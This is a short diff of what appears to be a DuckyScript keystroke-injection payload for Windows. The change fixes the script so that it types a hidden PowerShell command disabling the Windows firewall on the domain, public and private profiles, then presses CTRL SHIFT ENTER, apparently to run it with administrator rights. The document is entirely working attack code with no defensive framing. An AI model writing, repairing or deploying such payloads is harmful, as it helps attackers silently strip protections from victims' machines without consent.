@@ -6,7 +6,7 @@ REM Target: Windows environment
 
 GUI R
 DELAY 400
-powershell -WindowStyle Hidden -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+STRING powershell -WindowStyle Hidden -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 DELAY 400
 CTRL SHIFT ENTER
 DELAY 400
